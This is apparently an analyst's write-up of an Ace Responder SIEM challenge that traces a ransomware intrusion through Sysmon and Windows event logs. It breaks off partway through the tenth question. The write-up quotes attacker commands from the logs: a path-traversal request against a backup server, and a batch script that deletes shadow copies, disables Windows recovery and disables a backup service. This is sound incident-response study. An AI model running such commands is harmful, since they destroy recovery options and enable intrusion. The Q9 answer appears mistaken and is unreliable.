https://aceresponder.com/challenge/locked-up

This is an Elastic SIEM challenge on the platform Ace Responder.

Scenario:

>An unknown attacker successfully breached the defenses of your organization, gaining unauthorized access to your domain. The intruder managed to distribute a potent strain of ransomware across the entire network. The impact has been swift and severe – all users are reporting an inability to access crucial files, and the administrative team is grappling with a critical issue: the ransomware has blocked access to the backup server.
>
>The security team conducted an initial investigation and identified some unusual network activity. A scan of DNS traffic flagged a high-risk domain: `anydeskhelp.com`. These connections were not known to be malicious at the time of compromise and were not blocked. Using this information, analyze the intrusion and determine whether the organization can recover without paying the ransom.

Before diving into the questions, I started with the information provided and ran with the 
query `anydeskhelp.com`, and I was quickly inundated with HTTP results (over 15k hits). 

I refined the query by excluding the results I was seeing most (network* excludes the values 'network' and 'network_traffic'):

```
anydeskhelp.com AND NOT event.category: network*
```

| Time                         | host.name  | winlog.event_data.User | event.code | event.action                     | winlog.event_data.Image                                                         | winlog.event_data.Contents                                                                                                                                    |
|------------------------------|------------|-------------------------|------------|----------------------------------|----------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Feb 25, 2024 @ 11:53:07.048 | Win11-20   | aceresponder\erin       | 15         | File stream created (rule: FileCreateStreamHash) | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe                      | [ZoneTransfer] ZoneId=3 ReferrerUrl=http://anydeskhelp.com:443/?tm=tt&ap=gads&aaid=ada8XDYJCV5Nw&gclid=EAIaIQobChMIprXBmp7HhAMV0ICOCB0QwgWsEAEYASAAEgJtjPD_BwE |
| Feb 25, 2024 @ 11:53:07.344 | Win11-20   | aceresponder\erin       | 15         | File stream created (rule: FileCreateStreamHash) | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe                      | [ZoneTransfer] ZoneId=3 ReferrerUrl=http://anydeskhelp.com:443/?tm=tt&ap=gads&aaid=ada8XDYJCV5Nw&gclid=EAIaIQobChMIprXBmp7HhAMV0ICOCB0QwgWsEAEYASAAEgJtjPD_BwE HostUrl=http://anydeskhelp.com:443/AnyDeskSetup.exe |
| Feb 25, 2024 @ 11:58:06.320 | Win11-20   | aceresponder\erin       | 22         | Dns query (rule: DnsQuery)       | C:\Users\Erin\Downloads\AnyDeskSetup.exe                                         | -                                                                                                                                                            |
| Feb 25, 2024 @ 11:58:20.179 | Win11-20   | aceresponder\erin       | 22         | Dns query (rule: DnsQuery)       | C:\Users\Erin\Downloads\AnyDeskSetup.exe                                         | -                                                                                                                                                            |
| Feb 25, 2024 @ 11:58:20.179 | Win11-20   | aceresponder\erin       | 22         | Dns query (rule: DnsQuery)       | C:\Users\Erin\Downloads\AnyDeskSetup.exe                                         | -                                                                                                                                                            |
| Feb 25, 2024 @ 11:58:21.190 | Win11-20   | aceresponder\erin       | 22         | Dns query (rule: DnsQuery)       | C:\Users\Erin\Downloads\AnyDeskSetup.exe                                         | -                                                                                                                                                            |
| Feb 25, 2024 @ 11:59:54.354 | Win11-20   | aceresponder\erin       | 22         | Dns query (rule: DnsQuery)       | C:\Users\Erin\Downloads\AnyDeskSetup.exe                                         | -                                                                                                                                                            |
| Feb 25, 2024 @ 12:03:45.627 | Win11-20   | aceresponder\erin       | 22         | Dns query (rule: DnsQuery)       | C:\Program Files\WindowsApps\MicrosoftTeams_24004.1403.2634.2418_x64__8wekyb3d8bbwe\msteams.exe | -                                                                                                                                                            |
| Feb 25, 2024 @ 12:27:00.034 | Win11-20   | aceresponder\erin       | 22         | Dns query (rule: DnsQuery)       | C:\Windows\ImmersiveControlPanel\SystemSettings.exe                              | -                                                                                                                                                            |

Next, I took a quick glance at:

- Failed logins -- `event.code: 4625` there were no results.
- Access token manipulation -- `event.code: 4624 AND winlog.event_data.LogonType: 9` there were no results
- Logon Type 4 -- `event.code: 4624 AND winlog.event_data.LogonType: 4` this is for batch logons (scheduled tasks).
- Logon Type 9 -- `event.code: 4624 AND winlog.event_data.LogonType: 9` there were no results. This is for Alternate Credentials Specified sign-ins: the caller cloned its current token and specified new credentials for outbound connections. It can appear a result of RunAs with /netonly flag, CreateProcessWithLogonW using the LOGON_NETCREDENTIALS_ONLY flag, or LogonUserW with LOGON32_LOGON_NEW_CREDENTIALS.
- Logon Type 10 -- `event.code: 4624 AND winlog.event_data.LogonType: 10` there were no results. This is for Remote Interactive sign-ins over RDP: a user logged on to this computer remotely using Terminal Services or Remote Desktop.
- Logon Type 3 -- `event.code: 4624 AND winlog.event_data.LogonType: 3` 422 hits. This is for network sign-ins, ie: a user accesses a file share, a vulnerability scanner authenticates to perform checks, an admin is remotely using PS, or an attacker uses PsExec to run a payload on a remote system. Reviewing the field statistics for winlog.event_data.TargetUserName, some of the top 5 values aside from 'dc\$' included 'ace', 'WIN11-20\$', 'WIN11-21\$', and 'erin'.

**Q1. Foothold: Which of the following best describes the technique used to gain access to the domain?**

Based on the first query above, I concluded that the answer was Malvertising: erin appears to have downloaded and launched AnyDeskSetup.exe using Edge, which subsequently sent a DNS query back to anydeskhelp.com. Afterwards, msteams.exe and SystemSettings.exe also sent DNS queries for this domain. Its not immediately clear to me why this would happen.

**Q2. Implant: What file did Erin download and execute?**

See the last query for more information.

**Q3. Process Injection: Which process did the attacker inject into shortly after execution on Win11-20?**

Before proceeding to the actual question, I want to understand what AnyDeskSetup.exe was doing:  

```
event.code: 1 AND winlog.event_data.ParentImage:AnyDeskSetup.exe
```

| Time                        | host.name | winlog.event_data.Image                                   | winlog.event_data.CommandLine                                                                                                                                                                      |
| --------------------------- | --------- | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Feb 25, 2024 @ 12:07:12.296 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c whoami                                                                                                                                                                                      |
| Feb 25, 2024 @ 12:07:23.147 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c systeminfo                                                                                                                                                                                  |
| Feb 25, 2024 @ 12:07:33.412 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c whoami /all                                                                                                                                                                                 |
| Feb 25, 2024 @ 12:07:37.682 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c net user /domain                                                                                                                                                                            |
| Feb 25, 2024 @ 12:07:45.132 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c net user /domain                                                                                                                                                                            |
| Feb 25, 2024 @ 12:07:51.859 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c tasklist                                                                                                                                                                                    |
| Feb 25, 2024 @ 12:07:58.555 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c schtasks                                                                                                                                                                                    |
| Feb 25, 2024 @ 12:08:06.497 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c cmdkey /list                                                                                                                                                                                |
| Feb 25, 2024 @ 12:21:04.602 | Win11-20  | C:\Windows\System32\cmd.exe                               | cmd /c schtasks /QUERY \| findstr /I backup                                                                                                                                                        |
| Feb 25, 2024 @ 12:51:01.908 | Win11-20  | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://10.0.0.4/backup_search.php?file=../../../../srv/nfs/Win11-20/Erin/Documents/backup_helper.ini'" |
| Feb 25, 2024 @ 13:11:54.013 | Win11-20  | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://10.0.0.4/backup_search.php?file=../../../../srv/nfs/Win11-20/Erin/Documents/backup_helper.ini'" |

These look like standard enumeration commands, along with a PowerShell command that looks like a Local File Inclusion (LFI) attack on a backup server. There may be sensitive data in 'backup_helper.ini', which looks like a configuration file. Since we know there's cmd.exe execution, let's see what the command lines look like for Win11-20 with:

```
host.name: Win11-20 AND winlog.event_data.Image: cmd.exe AND winlog.event_data.CommandLine: *
```

| **Time**                    | **winlog.event_data.CommandLine**                 | **winlog.event_data.ParentCommandLine**                                           |
| --------------------------- | ------------------------------------------------- | --------------------------------------------------------------------------------- |
| Feb 25, 2024 @ 12:07:12.296 | cmd /c whoami                                     | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:07:23.147 | cmd /c systeminfo                                 | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:07:33.412 | cmd /c whoami /all                                | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:07:37.682 | cmd /c net user /domain                           | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:07:45.132 | cmd /c net user /domain                           | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:07:51.859 | cmd /c tasklist                                   | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:07:58.555 | cmd /c schtasks                                   | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:08:06.497 | cmd /c cmdkey /list                               | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:08:30.450 | "C:\Windows\system32\cmd.exe"                     | "CollectGuestLogs.exe" -Mode:ga -FileName:D:\CollectGuestLogsTemp\VMAgentLogs.zip |
| Feb 25, 2024 @ 12:21:04.602 | cmd /c schtasks /QUERY \| findstr /I backup       | "C:\Users\Erin\Downloads\AnyDeskSetup.exe"                                        |
| Feb 25, 2024 @ 12:35:40.217 | "C:\Windows\system32\cmd.exe"                     | "CollectGuestLogs.exe" -Mode:ga -FileName:D:\CollectGuestLogsTemp\VMAgentLogs.zip |
| Feb 25, 2024 @ 13:09:45.906 | "C:\Windows\system32\cmd.exe"                     | "CollectGuestLogs.exe" -Mode:ga -FileName:D:\CollectGuestLogsTemp\VMAgentLogs.zip |
| Feb 25, 2024 @ 13:14:45.123 | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat | C:\Windows\system32\wsmprovhost.exe -Embedding                                    |
| Feb 25, 2024 @ 13:15:02.474 | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat | C:\Windows\system32\wsmprovhost.exe -Embedding                                    |
| Feb 25, 2024 @ 13:15:53.431 | C:\Windows\system32\cmd.exe /c "ver"              | "C:\Temp\letslockyoudown.exe"                                                     |
| Feb 25, 2024 @ 13:16:10.443 | C:\Windows\system32\cmd.exe /c "ver"              | "C:\Temp\letslockyoudown.exe"                                                     |
| Feb 25, 2024 @ 13:20:53.697 | C:\Windows\system32\cmd.exe /c "ver"              | "C:\Temp\letslockyoudown.exe"                                                     |
| Feb 25, 2024 @ 13:25:53.822 | C:\Windows\system32\cmd.exe /c "ver"              | "C:\Temp\letslockyoudown.exe"                                                     |
| Feb 25, 2024 @ 13:30:53.643 | C:\Windows\system32\cmd.exe /c "ver"              | "C:\Temp\letslockyoudown.exe"                                                     |

'CollectGuestLogs.exe', 'tiny.bat', and 'letslockyoudown.exe' look suspicious. I looked closer at the 'CollectGuestLogs.exe', and it launches from 'C:\WindowsAzure\GuestAgent_2.7.41491.1102_2024-01-23_194431'. For completeness, I checked its SHA256 hash in VirusTotal and it came out OK.

Now let's find out what child processes of cmd.exe may have been doing:

```
host.name: Win11-20 AND  winlog.event_data.ParentImage: cmd.exe AND winlog.event_data.CommandLine: *
```

| **Time**                    | **winlog.event_data.CommandLine**                            | **winlog.event_data.ParentCommandLine**           |
| --------------------------- | ------------------------------------------------------------ | ------------------------------------------------- |
| Feb 25, 2024 @ 12:07:12.329 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c whoami                                     |
| Feb 25, 2024 @ 12:07:12.603 | whoami                                                       | cmd /c whoami                                     |
| Feb 25, 2024 @ 12:07:23.154 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c systeminfo                                 |
| Feb 25, 2024 @ 12:07:23.351 | systeminfo                                                   | cmd /c systeminfo                                 |
| Feb 25, 2024 @ 12:07:33.445 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c whoami /all                                |
| Feb 25, 2024 @ 12:07:33.938 | whoami /all                                                  | cmd /c whoami /all                                |
| Feb 25, 2024 @ 12:07:37.689 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c net user /domain                           |
| Feb 25, 2024 @ 12:07:37.979 | net user /domain                                             | cmd /c net user /domain                           |
| Feb 25, 2024 @ 12:07:45.139 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c net user /domain                           |
| Feb 25, 2024 @ 12:07:45.343 | net user /domain                                             | cmd /c net user /domain                           |
| Feb 25, 2024 @ 12:07:51.868 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c tasklist                                   |
| Feb 25, 2024 @ 12:07:52.068 | tasklist                                                     | cmd /c tasklist                                   |
| Feb 25, 2024 @ 12:07:58.563 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c schtasks                                   |
| Feb 25, 2024 @ 12:07:58.853 | schtasks                                                     | cmd /c schtasks                                   |
| Feb 25, 2024 @ 12:08:06.504 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c cmdkey /list                               |
| Feb 25, 2024 @ 12:08:06.809 | cmdkey /list                                                 | cmd /c cmdkey /list                               |
| Feb 25, 2024 @ 12:08:30.459 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | "C:\Windows\system32\cmd.exe"                     |
| Feb 25, 2024 @ 12:21:04.625 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | cmd /c schtasks /QUERY \| findstr /I backup       |
| Feb 25, 2024 @ 12:21:04.902 | schtasks /QUERY                                              | cmd /c schtasks /QUERY \| findstr /I backup       |
| Feb 25, 2024 @ 12:21:04.907 | findstr /I backup                                            | cmd /c schtasks /QUERY \| findstr /I backup       |
| Feb 25, 2024 @ 12:35:40.258 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | "C:\Windows\system32\cmd.exe"                     |
| Feb 25, 2024 @ 13:09:45.940 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | "C:\Windows\system32\cmd.exe"                     |
| Feb 25, 2024 @ 13:14:45.164 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:14:45.271 | sc config "Netbackup Legacy Network service" start= disabled | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:14:45.321 | bcdedit /set {default}                                       | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:14:45.345 | bcdedit /set {default} recoveryenabled No                    | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:14:45.405 | vssadmin.exe Delete Shadows /all /quiet                      | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:14:45.896 | wmic.exe Shadowcopy Delete                                   | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:15:02.568 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1      | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:15:02.807 | sc config "Netbackup Legacy Network service" start= disabled | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:15:02.853 | bcdedit /set {default}                                       | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:15:02.882 | bcdedit /set {default} recoveryenabled No                    | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:15:02.965 | vssadmin.exe Delete Shadows /all /quiet                      | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |
| Feb 25, 2024 @ 13:15:03.610 | wmic.exe Shadowcopy Delete                                   | "C:\Windows\system32\cmd.exe" /c C:\Temp\tiny.bat |

Neat. Now we know that 'tiny.bat' ran:

1. `sc config "Netbackup Legacy Network service" start= disabled` which disabled the service from starting on the next boot. 
2. `bcdedit /set {default} recoveryenabled No` and disabled the Windows Recovery Environment for the default boot entry, preventing booting into recovery mode when there's an issue.
3. `vssadmin.exe Delete Shadows /all /quiet` and quietly deletes all snapshots created by the Volume Shadow Copy Service (VSS). 
4. `wmic.exe Shadowcopy Delete` and uses the Windows Management Instrumentation Command-line (WMIC) to do the same as (3). Why would an attacker do this? I surmise this is because some admins may disable one of the tools, or perhaps it is redundancy in the event that one of these commands is detected and blocked.

I'll make a note of these results and proceed with trying to answer the question for now.

I run this query to look for Sysmon Event ID 8 (CreateRemoteThread detected): `host.name: "Win11-20" AND event.code: 8`

CreateRemoteThread is a Windows API function that is commonly misused for injecting malicious code into a running process. It is associated with techniques like shellcode injection, DLL injection, and reflective DLL loading.

This was the result:

| Time                        | host.name | winlog.event_data.SourceProcessId | winlog.event_data.SourceImage            | winlog.event_data.TargetImage                                                                   | winlog.event_data.TargetProcessId |
| --------------------------- | --------- | --------------------------------- | ---------------------------------------- | ----------------------------------------------------------------------------------------------- | --------------------------------- |
| Feb 25, 2024 @ 12:03:44.679 | Win11-20  | 8360                              | C:\Users\Erin\Downloads\AnyDeskSetup.exe | C:\Program Files\WindowsApps\MicrosoftTeams_24004.1403.2634.2418_x64__8wekyb3d8bbwe\msteams.exe | 6176                              |
| Feb 25, 2024 @ 12:26:58.046 | Win11-20  | 8360                              | C:\Users\Erin\Downloads\AnyDeskSetup.exe | C:\Windows\ImmersiveControlPanel\SystemSettings.exe                                             | 7352                              |

This neatly matches with the mystery processes from the results of the first query. The attacker appears to have injected into msteams.exe and SystemSettings.exe. Here's the whole message from the event:

```
CreateRemoteThread detected:
RuleName: -
UtcTime: 2024-02-25 20:26:58.045
SourceProcessGuid: {772bda65-9bcc-65db-3805-000000002d00}
SourceProcessId: 8360
SourceImage: C:\Users\Erin\Downloads\AnyDeskSetup.exe
TargetProcessGuid: {772bda65-68bb-65db-7102-000000002d00}
TargetProcessId: 7352
TargetImage: C:\Windows\ImmersiveControlPanel\SystemSettings.exe
NewThreadId: 4640
StartAddress: 0x0000027A72C30000
StartModule: -
StartFunction: -
SourceUser: aceresponder\erin
TargetUser: aceresponder\erin
```


**Q4. Discovery: The attacker enumerated scheduled tasks for a specific word. What word were they looking for?**

We actually know this because of the work for the prior question!

**Q5. Lateral Movement: Which host did the attacker move to after Win11-20?**

It looks like the host in question was 10.0.0.4. A quick check confirmed the hostname: `host.ip: 10.0.0.4`

**Q6. Lateral Tool Transfer: How did the attacker place an implant on backup?**

I wasn't really sure how to begin answering this question with the information I already had. I took a quick look at what PowerShell actions may have been taken on the host Win11-20:

```
host.name: Win11-20 AND winlog.event_data.ParentImage: powershell.exe
```

Here's a brief view of the results here: 

| **Time**                    | **winlog.event_data.CommandLine**                                                                       | **winlog.event_data.ParentCommandLine**                                                           |
| --------------------------- | ------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| Feb 25, 2024 @ 13:31:59.864 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                                 | "powershell.exe" -ExecutionPolicy Bypass -File C:\BackupDocuments.ps1                             |
| Feb 25, 2024 @ 13:31:53.794 | "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://uber.com                         | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Temp\user_simulation.ps1" |
| Feb 25, 2024 @ 13:28:50.645 | "C:\Windows\explorer.exe" C:\Users\Carol\Pictures                                                       | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Temp\user_simulation.ps1" |
| Feb 25, 2024 @ 13:27:57.605 | "C:\Windows\explorer.exe" C:\Users\Carol\Documents                                                      | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Temp\user_simulation.ps1" |
| Feb 25, 2024 @ 13:26:59.178 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                                 | "powershell.exe" -ExecutionPolicy Bypass -File C:\BackupDocuments.ps1                             |
| Feb 25, 2024 @ 13:26:32.311 | "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://libero.it                        | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Temp\user_simulation.ps1" |
| Feb 25, 2024 @ 13:22:34.167 | "C:\Windows\explorer.exe" C:\Users\Carol\Music                                                          | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Temp\user_simulation.ps1" |
| Feb 25, 2024 @ 13:21:59.152 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                                 | "powershell.exe" -ExecutionPolicy Bypass -File C:\BackupDocuments.ps1                             |
| Feb 25, 2024 @ 13:21:20.712 | "C:\Program Files\Windows NT\Accessories\wordpad.exe" C:\Users\Carol\Documents\Meetings\Minutes2023.rtf | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Temp\user_simulation.ps1" |
| Feb 25, 2024 @ 13:19:07.161 | "C:\Windows\explorer.exe" C:\Users\Carol\Desktop\Personal                                               | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Temp\user_simulation.ps1" |
| Feb 25, 2024 @ 13:16:59.139 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                                 | "powershell.exe" -ExecutionPolicy Bypass -File C:\BackupDocuments.ps1                             |

host.name: Win11-20 AND @timestamp > "2024-02-25T13:11:54.013Z"

I looked at the event provider "Microsoft-Windows-TaskScheduler/Operational", but there weren't any events available for these:

| EID | Description                                                                   |
| --- | ----------------------------------------------------------------------------- |
| 100 | Task Scheduler started the x instance of the y task for user z.               |
| 102 | Task Scheduler successfully finished the x instance of the y task for user z. |
| 106 | The user x registered the Task Scheduler task y (New Scheduled Task)          |
| 140 | Scheduled task updated                                                        |
| 141 | User x deleted Task Scheduler task y.                                         |
| 200 | Scheduled task executed/completed                                             |
| 201 | Scheduled task executed/completed                                             |

Also no results for these:

| EID  | Description                                                                                                                                                                                                                 |
| ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 5140 | File Share: A network share object was accessed                                                                                                                                                                             |
| 4648 | Logon specifying alt creds - if NLA enabled                                                                                                                                                                                 |
| 1024 | Outbound RDP connection attempts, includes username, dest hostname, and IP addr, even if a session doesn't complete connection                                                                                              |
| 1102 | Outbound RDP connection attempts, includes username, dest IP addr, even if a session doesn't complete connection                                                                                                            |
| 4648 | Logon was attempted with explicit credentials, generated when an account logs in using a different privilege and has to explicitly enter creds (ie, the RUNAS command), or when UAC prompts a non-admin user to enter creds |
| 6    | Microsoft-Windows-WinRM%4Operational: WSMan session init (session created, dest hostname or IP, current logged-on username)                                                                                                 |

When I checked the following, I found something interesting:

| EID  | Description                                |
| ---- | ------------------------------------------ |
| 4698 | A scheduled task was created (if audited). |
| 4699 | A scheduled task was deleted               |

```
host.name:Win11-22 AND event.code: (4698 OR 4699)
```

Two events appear that appear to do the same thing: creating a Scheduled Task, with the Task Name "\BackupVSS" executing "C:\Temp\letslockyoudown.exe" (we saw this earlier!). Here's what one of the message fields looks like:

```
A scheduled task was created.

Subject:
	Security ID:		S-1-5-21-2979473758-3143654226-3182884599-500
	Account Name:		ace
	Account Domain:		aceresponder
	Logon ID:		0x3BB9632

Task Information:
	Task Name: 		\BackupVSS
	Task Content: 		<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\BackupVSS</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <Duration>P9999D</Duration>
        <StopAtDurationEnd>true</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-02-25T21:16:05Z</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-5-32-545</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Temp\letslockyoudown.exe</Command>
    </Exec>
  </Actions>
</Task>

Other Information:
	ProcessCreationTime: 		12666373951979621
	ClientProcessId: 			5060
	ParentProcessId: 			936
	FQDN: 		0
```

We've answered the question at this point, but let's pivot on this new information. What is this program doing?

```
host.name: "Win11-20" AND winlog.event_data.ParentProcessName: "letslockyoudown.exe"
```

| Time                        | winlog.event_data.CommandLine                                                                         |
| --------------------------- | ----------------------------------------------------------------------------------------------------- |
| Feb 25, 2024 @ 13:17:05.507 | notepad.exe RANSOM_NOTE.txt                                                                           |
| Feb 25, 2024 @ 13:16:54.922 | notepad.exe RANSOM_NOTE.txt                                                                           |
| Feb 25, 2024 @ 13:16:44.491 | notepad.exe RANSOM_NOTE.txt                                                                           |
| Feb 25, 2024 @ 13:16:33.973 | notepad.exe RANSOM_NOTE.txt                                                                           |
| Feb 25, 2024 @ 13:16:23.531 | notepad.exe RANSOM_NOTE.txt                                                                           |
| Feb 25, 2024 @ 13:16:22.766 | notepad.exe RANSOM_NOTE.txt                                                                           |
| Feb 25, 2024 @ 13:16:20.772 | "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --single-argument https://bitcoin.org/ |
| Feb 25, 2024 @ 13:16:10.415 | C:\Windows\system32\cmd.exe /c "ver"                                                                  |
| Feb 25, 2024 @ 13:16:09.446 | "C:\Temp\letslockyoudown.exe"                                                                         |
| Feb 25, 2024 @ 13:16:06.695 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1                                               |

Looks like this displays a ransom note, probably involving a Bitcoin payment.

**Q7. Exploitation: Which of the following best describes the vulnerability the attacker exploited to execute the implant on backup?**

As we discussed before, this looks like exploitation of a Local File Inclusion vulnerability.

**Q8. Exfiltration: The attacker exfiltrated a file that belonged to Carol from backup. What is the name of the file?**

I attempted to use `auditd.data.syscall:socket` as part of a query, only to realise that it wasn't available. This was my next best attempt:

```
host.name: backup AND carol AND "type=PATH"
```

Which resulted in an event with this `message` field:

```
type=PATH 
msg=audit(1708894406.576:1084): 
item=0 
name="/srv/nfs/Win11-21/Carol/Documents/Strategy2030.pptx" 
inode=260821 
dev=08:01 
mode=0100755 
ouid=e 
ogid=65534 
rdev=00:00 
nametype=NORMAL 
cap_fp=0 
cap_fi=0 
cap_fe=0 
cap_fver=0 
cap_frootid=0OUID="nobody" 
OGID="nogroup"
```

**Q9. Credential Access: Which file likely gave the attacker Domain Admin credentials?**

notepad.exe RANSOM_NOTE.txt


**Q10. Lateral Movement 2: Which host did the attacker move to after backup?**

I started with hunting for evidence of DCOM lateral movement:

```
event.code:1 AND winlog.event_data.Image:mmc.exe
```

This didn't reveal anything.

Switching gears for a second, I decided to check the DC (clearly a valuable asset) for Event ID 4648: a logon was attempted with explicit credentials, generated when an account logs in using a different privilege and has to explicitly enter creds (ie, the RUNAS command), or when UAC prompts a non-admin user to enter creds.

```
host.name: dc AND event.code: 4648
```

There were 15 hits:

| Time                        | winlog.event_data.ProcessName                                  | winlog.event_data.TargetUserName | winlog.event_data.SubjectLogonId | winlog.event_data.TargetServerName |
|-----------------------------|---------------------------------------------------------------|----------------------------------|----------------------------------|------------------------------------|
| Feb 25, 2024 @ 13:14:30.671 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | dc.aceresponder.lab               |
| Feb 25, 2024 @ 13:14:31.107 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | dc.aceresponder.lab               |
| Feb 25, 2024 @ 13:14:31.286 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | dc.aceresponder.lab               |
| Feb 25, 2024 @ 13:14:41.339 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | dc.aceresponder.lab               |
| Feb 25, 2024 @ 13:14:41.347 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | dc.aceresponder.lab               |
| Feb 25, 2024 @ 13:14:42.456 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     | ace                              | 0x488835                         | Win11-21                          |
